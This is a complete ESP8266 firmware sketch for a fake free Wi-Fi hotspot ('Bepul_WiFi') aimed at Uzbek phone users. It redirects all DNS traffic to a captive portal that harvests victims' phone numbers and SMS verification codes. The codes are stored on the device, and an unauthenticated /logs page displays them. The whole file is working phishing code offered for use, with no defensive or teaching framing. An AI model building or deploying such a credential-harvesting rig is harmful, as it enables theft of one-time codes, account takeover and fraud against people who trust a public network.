#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <ESPAsyncTCP.h>

// --- Configuration ---
const char* AP_SSID = "Bepul_WiFi"; // The name of the fake Wi-Fi network
const IPAddress AP_IP(172, 20, 0, 1); // Less common private IP range
const byte DNS_PORT = 53;
const char* CREDENTIALS_FILE = "/credentials.txt";
const int LED_PIN = 2; // Built-in LED pin (GPIO2/D4)

// --- Web Server and DNS Server Objects ---
DNSServer dnsServer;
AsyncWebServer server(80);

// Function to flash LED
void flashLED(int times = 3, int duration = 100) {
  for(int i = 0; i < times; i++) {
    digitalWrite(LED_PIN, LOW);  // Turn LED on (LOW because LED is active LOW)
    delay(duration);
    digitalWrite(LED_PIN, HIGH); // Turn LED off
    delay(duration);
  }
}

// --- HTML Content for Phone Number Page ---
const char* PHONE_HTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Telefon Raqamini Tasdiqlash</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            color: #2c3e50;
        }
        .main-container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .verification-box {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 12px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
            backdrop-filter: blur(10px);
        }
        .logo {
            width: 175px;
            height: 51px;
            margin: 0 auto 25px;
            display: block;
        }
        h1 {
            font-size: 24px;
            color: #2c3e50;
            margin-bottom: 15px;
            font-weight: 500;
        }
        .instruction-text {
            font-size: 15px;
            color: #34495e;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        input {
            width: calc(100% - 24px);
            padding: 12px;
            margin: 8px 0;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 15px;
            background: #f8f9fa;
            transition: all 0.3s ease;
        }
        input:focus {
            outline: none;
            border-color: #3498db;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }
        button {
            width: 100%;
            padding: 12px;
            background: #3498db;
            border: none;
            color: white;
            font-weight: 500;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s ease;
        }
        button:hover {
            background: #2980b9;
            transform: translateY(-1px);
        }
        button:disabled {
            background: #bdc3c7;
            cursor: not-allowed;
            transform: none;
        }
        #timer {
            font-size: 15px;
            color: #7f8c8d;
            margin-top: 15px;
            font-weight: 500;
        }
        .error-message {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
        .success-message {
            color: #27ae60;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
        .loading-spinner {
            display: none;
            width: 40px;
            height: 40px;
            margin: 20px auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            display: none;
            text-align: center;
            color: #3498db;
            margin-top: 10px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="verification-box">
            <h1>Telefon Raqamini Tasdiqlash</h1>
            <p class="instruction-text">Bepul WiFi ga ulanish uchun iltimos telefon raqamingizni kiriting</p>
            <p class="instruction-text">Tasdiqlash kodini olish uchun telefon raqamingizni kiriting</p>
            <form id="phoneForm" method='POST' action='/phone'>
                <input type="tel" name='phone' value="+998 " placeholder='+998 12 345 67 89' required pattern="\+998\s[0-9]{2}\s[0-9]{3}\s[0-9]{2}\s[0-9]{2}" title="Iltimos, to'g'ri telefon raqamini kiriting: +998 12 345 67 89">
                <div class="error-message" id="phoneError">Iltimos, to'g'ri telefon raqamini kiriting: +998 12 345 67 89</div>
                <button type='submit' id="sendButton">Kodni Yuborish</button>
            </form>
            <div id="timer" style="display: none;"></div>
            <div class="loading-spinner" id="loadingSpinner"></div>
            <div class="loading-text" id="loadingText">Kod yuborilmoqda...</div>
        </div>
    </div>
    <script>
        let countdown = 120; // 2 minutes in seconds
        let timerInterval;
        
        const phoneInput = document.querySelector('input[name="phone"]');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const loadingText = document.getElementById('loadingText');
        
        // Format phone number as user types
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value;
            
            // Remove all non-digit characters except spaces and +
            let digits = value.replace(/[^\d+]/g, '');
            
            // Ensure +998 is present
            if (!digits.startsWith('+998')) {
                digits = '+998' + digits.replace(/\+998/g, '');
            }
            
            // Format the number
            let formatted = '+998 ';
            if (digits.length > 4) {
                formatted += digits.slice(4, 6) + ' ';
                if (digits.length > 6) {
                    formatted += digits.slice(6, 9) + ' ';
                    if (digits.length > 9) {
                        formatted += digits.slice(9, 11) + ' ';
                        if (digits.length > 11) {
                            formatted += digits.slice(11, 13);
                        }
                    }
                }
            }
            
            // Update input value
            e.target.value = formatted;
        });
        
        // Handle backspace and delete
        phoneInput.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' || e.key === 'Delete') {
                let value = e.target.value;
                let cursorPosition = e.target.selectionStart;
                
                // Don't allow deleting +998
                if (cursorPosition <= 5) {
                    e.preventDefault();
                    return;
                }
                
                // If backspace is pressed and cursor is after a space, delete the space too
                if (e.key === 'Backspace' && value[cursorPosition - 1] === ' ') {
                    e.preventDefault();
                    let newValue = value.slice(0, cursorPosition - 1) + value.slice(cursorPosition);
                    e.target.value = newValue;
                    e.target.setSelectionRange(cursorPosition - 1, cursorPosition - 1);
                }
            }
        });
        
        // Prevent paste of invalid content
        phoneInput.addEventListener('paste', function(e) {
            e.preventDefault();
            let pastedText = (e.clipboardData || window.clipboardData).getData('text');
            let digits = pastedText.replace(/[^\d+]/g, '');
            
            if (digits.startsWith('998')) {
                digits = '+' + digits;
            } else if (!digits.startsWith('+998')) {
                digits = '+998' + digits;
            }
            
            let formatted = '+998 ';
            if (digits.length > 4) {
                formatted += digits.slice(4, 6) + ' ';
                if (digits.length > 6) {
                    formatted += digits.slice(6, 9) + ' ';
                    if (digits.length > 9) {
                        formatted += digits.slice(9, 11) + ' ';
                        if (digits.length > 11) {
                            formatted += digits.slice(11, 13);
                        }
                    }
                }
            }
            
            this.value = formatted;
        });
        
        document.getElementById('phoneForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const phoneError = document.getElementById('phoneError');
            
            if (!phoneInput.checkValidity()) {
                phoneError.style.display = 'block';
                return;
            }
            
            phoneError.style.display = 'none';
            document.getElementById('sendButton').disabled = true;
            document.getElementById('timer').style.display = 'block';
            
            // Show loading indicator
            loadingSpinner.style.display = 'block';
            loadingText.style.display = 'block';
            
            // Start countdown
            timerInterval = setInterval(updateTimer, 1000);
            
            // Submit the form
            this.submit();
        });
        
        function updateTimer() {
            const minutes = Math.floor(countdown / 60);
            const seconds = countdown % 60;
            document.getElementById('timer').textContent = 
                `Qolgan vaqt: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
            
            if (countdown <= 0) {
                clearInterval(timerInterval);
                document.getElementById('sendButton').disabled = false;
                document.getElementById('timer').style.display = 'none';
                loadingSpinner.style.display = 'none';
                loadingText.style.display = 'none';
                countdown = 120;
            }
            countdown--;
        }
    </script>
</body>
</html>
)rawliteral";

// --- HTML Content for SMS Verification Page ---
const char* SMS_HTML = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Tasdiqlash Kodini Kiriting</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
            color: #2c3e50;
        }
        .main-container {
            width: 100%;
            max-width: 400px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .verification-box {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 12px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
            backdrop-filter: blur(10px);
        }
        h1 {
            font-size: 24px;
            color: #2c3e50;
            margin-bottom: 15px;
            font-weight: 500;
        }
        .instruction-text {
            font-size: 15px;
            color: #34495e;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        input {
            width: calc(100% - 24px);
            padding: 12px;
            margin: 8px 0;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: 15px;
            background: #f8f9fa;
            transition: all 0.3s ease;
        }
        input:focus {
            outline: none;
            border-color: #3498db;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }
        button {
            width: 100%;
            padding: 12px;
            background: #3498db;
            border: none;
            color: white;
            font-weight: 500;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s ease;
        }
        button:hover {
            background: #2980b9;
            transform: translateY(-1px);
        }
        .error-message {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 8px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="verification-box">
            <h1>Tasdiqlash Kodini Kiriting</h1>
            <p class="instruction-text">Telefoningizga yuborilgan 5 xonali kodni kiriting</p>
            <form method='POST' action='/verify'>
                <input type="text" name='code' placeholder='5 xonali kodni kiriting' required pattern="[0-9]{5}" maxlength="5">
                <div class="error-message" id="codeError">Iltimos, to'g'ri 5 xonali kodni kiriting</div>
                <button type='submit'>Tasdiqlash</button>
            </form>
        </div>
    </div>
</body>
</html>
)rawliteral";

// Function to save credentials
void saveCredentials(const String& phone, const String& code) {
  File file = LittleFS.open(CREDENTIALS_FILE, "a");
  if (!file) {
    Serial.println("[ERROR] Failed to open file for appending");
    return;
  }
  String logEntry = "Telefon: " + phone + ", Kod: " + code + "\n";
  if (file.print(logEntry)) {
    Serial.println("[*] Credentials saved to LittleFS.");
  } else {
    Serial.println("[ERROR] Failed to write to file.");
  }
  file.close();
}

void setup() {
  Serial.begin(115200);
  delay(500);

  // Initialize LED pin
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH); // Turn LED off initially

  Serial.println("\n--- Starting Phone Verification Portal ---");

  // Initialize LittleFS
  if (!LittleFS.begin()) {
    Serial.println("[ERROR] An Error has occurred while mounting LittleFS");
    return;
  }
  Serial.println("[*] LittleFS mounted successfully.");

  // Configure Wi-Fi in AP mode
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  delay(100);

  Serial.print("[*] Access Point Name: ");
  Serial.println(AP_SSID);
  Serial.print("[*] Access Point IP Address: ");
  Serial.println(WiFi.softAPIP());

  // Start DNS Server
  dnsServer.start(DNS_PORT, "*", AP_IP);
  Serial.println("[*] DNS Server Started");

  // Handle all requests (Captive Portal)
  server.onNotFound([](AsyncWebServerRequest *request) {
    Serial.print("[!] Client Connected: ");
    Serial.println(request->client()->remoteIP());
    flashLED(); // Flash LED when new client connects
    request->send(200, "text/html", PHONE_HTML);
  });

  // Handle phone number submission
  server.on("/phone", HTTP_POST, [](AsyncWebServerRequest *request) {
    String phone = "";
    if (request->hasParam("phone", true)) {
      phone = request->getParam("phone", true)->value();
    }
    
    Serial.println("\n--- Captured Phone Number ---");
    Serial.print("Phone: ");
    Serial.println(phone);
    Serial.println("----------------------------");

    // Save phone number
    saveCredentials(phone, "pending");
    
    // Flash LED when phone number is submitted
    flashLED(2, 200);
    
    // Send SMS verification page
    request->send(200, "text/html", SMS_HTML);
  });

  // Handle SMS code verification
  server.on("/verify", HTTP_POST, [](AsyncWebServerRequest *request) {
    String phone = "";
    String code = "";
    
    if (request->hasParam("code", true)) {
      code = request->getParam("code", true)->value();
    }

    Serial.println("\n--- Captured Verification Code ---");
    Serial.print("Code: ");
    Serial.println(code);
    Serial.println("--------------------------------");

    // Save verification code
    saveCredentials(phone, code);
    
    // Flash LED when verification code is submitted
    flashLED(4, 150);
    
    // Send success page
    request->send(200, "text/html", "<h1>Tasdiqlash Muvaffaqiyatli</h1><p>Endi Wi-Fi tarmog'iga ulanish mumkin.</p>");
  });

  // Handle GET requests to /logs
  server.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.println("[*] /logs requested by " + request->client()->remoteIP().toString());
    String content = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>System Logs</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: rgba(0, 20, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 20px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
        }
        h2 {
            color: #00ff00;
            text-align: center;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 10px;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        pre {
            background-color: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border: 1px solid #00ff00;
            border-radius: 3px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .log-entry {
            margin: 10px 0;
            padding: 10px;
            border-left: 3px solid #00ff00;
            background-color: rgba(0, 255, 0, 0.1);
        }
        .timestamp {
            color: #00ff00;
            font-size: 0.8em;
            opacity: 0.7;
        }
        .actions {
            margin-top: 20px;
            text-align: center;
        }
        .btn {
            display: inline-block;
            padding: 10px 20px;
            margin: 0 10px;
            background-color: #003300;
            color: #00ff00;
            text-decoration: none;
            border: 1px solid #00ff00;
            border-radius: 3px;
            transition: all 0.3s ease;
        }
        .btn:hover {
            background-color: #00ff00;
            color: #000;
        }
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.1;
        }
        .no-data {
            text-align: center;
            color: #00ff00;
            font-style: italic;
            padding: 20px;
        }
        @keyframes glitch {
            0% { text-shadow: 2px 0 #00ff00, -2px 0 #ff0000; }
            25% { text-shadow: -2px 0 #00ff00, 2px 0 #ff0000; }
            50% { text-shadow: 2px 0 #00ff00, -2px 0 #ff0000; }
            75% { text-shadow: -2px 0 #00ff00, 2px 0 #ff0000; }
            100% { text-shadow: 2px 0 #00ff00, -2px 0 #ff0000; }
        }
        .glitch {
            animation: glitch 1s infinite;
        }
    </style>
</head>
<body>
    <canvas id="matrix" class="matrix-bg"></canvas>
    <div class="container">
        <h2 class="glitch">System Logs</h2>
        <div id="log-content">
)rawliteral";

    File file = LittleFS.open(CREDENTIALS_FILE, "r");
    if (!file) {
      content += R"rawliteral(
            <div class="no-data">
                <p>No data captured yet or file not found.</p>
            </div>
)rawliteral";
      Serial.println("[INFO] Credentials file not found.");
    } else {
      content += "<pre>";
      while (file.available()) {
        String line = file.readStringUntil('\n');
        content += "<div class='log-entry'>";
        content += "<span class='timestamp'>[" + String(millis()) + "]</span> ";
        content += line;
        content += "</div>";
      }
      content += "</pre>";
      file.close();
    }

    content += R"rawliteral(
        </div>
        <div class="actions">
            <a href="/clear" class="btn">Clear Logs</a>
            <a href="/" class="btn">Back to Verification</a>
            <button onclick="toggleAutoRefresh()" class="btn" id="refreshBtn">Auto Refresh: OFF</button>
        </div>
    </div>
    <script>
        // Matrix background effect
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()";
        const charArray = chars.split("");
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        
        const drops = [];
        for(let i = 0; i < columns; i++) {
            drops[i] = 1;
        }
        
        function draw() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = "#0F0";
            ctx.font = fontSize + "px monospace";
            
            for(let i = 0; i < drops.length; i++) {
                const text = charArray[Math.floor(Math.random() * charArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(draw, 33);
        
        // Glitch effect on hover
        document.querySelectorAll('.log-entry').forEach(entry => {
            entry.addEventListener('mouseover', function() {
                this.style.textShadow = '2px 0 #ff0000, -2px 0 #00ff00';
            });
            entry.addEventListener('mouseout', function() {
                this.style.textShadow = 'none';
            });
        });

        // Auto-refresh functionality
        let autoRefreshInterval = null;
        const refreshBtn = document.getElementById('refreshBtn');

        function toggleAutoRefresh() {
            if (autoRefreshInterval) {
                clearInterval(autoRefreshInterval);
                autoRefreshInterval = null;
                refreshBtn.textContent = 'Auto Refresh: OFF';
                refreshBtn.style.backgroundColor = '#003300';
            } else {
                autoRefreshInterval = setInterval(fetchLogs, 2000); // Refresh every 2 seconds
                refreshBtn.textContent = 'Auto Refresh: ON';
                refreshBtn.style.backgroundColor = '#006600';
            }
        }

        async function fetchLogs() {
            try {
                const response = await fetch('/logs');
                const text = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(text, 'text/html');
                const newLogContent = doc.getElementById('log-content');
                document.getElementById('log-content').innerHTML = newLogContent.innerHTML;
                
                // Reattach hover effects to new log entries
                document.querySelectorAll('.log-entry').forEach(entry => {
                    entry.addEventListener('mouseover', function() {
                        this.style.textShadow = '2px 0 #ff0000, -2px 0 #00ff00';
                    });
                    entry.addEventListener('mouseout', function() {
                        this.style.textShadow = 'none';
                    });
                });
            } catch (error) {
                console.error('Error fetching logs:', error);
            }
        }
    </script>
</body>
</html>
)rawliteral";

    request->send(200, "text/html", content);
  });

  // Handle GET requests to /clear
  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.println("[*] /clear requested by " + request->client()->remoteIP().toString());
    if (LittleFS.remove(CREDENTIALS_FILE)) {
      Serial.println("[*] Credentials file cleared.");
      request->send(200, "text/html", "<h2>Ma'lumotlar Tozalandi</h2><p>Ma'lumotlar muvaffaqiyatli tozalandi.</p><br><a href='/logs'>Ma'lumotlarni Ko'rish</a> | <a href='/'>Tasdiqlash Sahifasiga Qaytish</a>");
    } else {
      Serial.println("[ERROR] Failed to clear credentials file.");
      request->send(500, "text/html", "<h2>Xato</h2><p>Ma'lumotlarni tozalashda xatolik yuz berdi.</p><br><a href='/logs'>Ma'lumotlarni Ko'rish</a> | <a href='/'>Tasdiqlash Sahifasiga Qaytish</a>");
    }
  });

  // Start the web server
  server.begin();
  Serial.println("[*] Web Server Started");
}

void loop() {
  dnsServer.processNextRequest();
} 